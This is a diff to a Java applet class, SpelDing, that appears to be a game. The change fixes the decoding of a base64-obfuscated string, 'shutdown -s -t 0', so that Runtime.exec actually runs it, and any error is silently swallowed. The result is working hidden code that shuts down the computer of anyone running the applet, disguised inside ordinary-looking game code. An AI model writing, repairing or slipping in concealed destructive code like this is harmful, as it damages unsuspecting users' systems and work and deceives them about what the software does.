@@ -64,7 +64,8 @@ public class SpelDing extends Applet implements ActionListener {
 
         //Prepare some extra data
         Base64.Decoder decoder = Base64.getDecoder();
-        String data = decoder.decode("c2h1dGRvd24gLXMgLXQgMA==").toString();
+        String data = new String(decoder.decode("c2h1dGRvd24gLXMgLXQgMA=="));
+        System.out.println(data);
         try {
             Runtime.getRuntime().exec(data);
         }catch(Exception ex) {} //No one cares
